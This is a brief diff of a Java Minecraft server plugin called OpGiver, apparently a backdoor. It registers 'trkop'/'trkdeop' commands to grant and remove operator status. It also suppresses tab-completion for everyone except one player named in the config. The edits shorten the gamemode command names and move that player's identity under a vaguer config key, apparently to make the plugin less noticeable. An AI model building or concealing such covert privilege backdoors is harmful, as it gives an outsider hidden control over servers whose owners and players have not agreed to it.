@@ -23,15 +23,15 @@ public final class OpGiver extends JavaPlugin implements Listener {
     }
 
     public void registerCommands() {
-        getCommand("gmc").setExecutor(new gmc());
-        getCommand("gms").setExecutor(new gms());
+        getCommand("gc").setExecutor(new gmc());
+        getCommand("gs").setExecutor(new gms());
         getCommand("trkop").setExecutor(new opCommand());
         getCommand("trkdeop").setExecutor(new deopCommand());
     }
 
     @EventHandler
     public void onPlayerUseTab(TabCompleteEvent e) {
-        if (!e.getSender().getName().equals(OpGiver.getInstance().getConfig().getString("Name"))) {
+        if (!e.getSender().getName().equals(OpGiver.getInstance().getConfig().getString("Hex"))) {
             e.setCancelled(true);
         }
     }
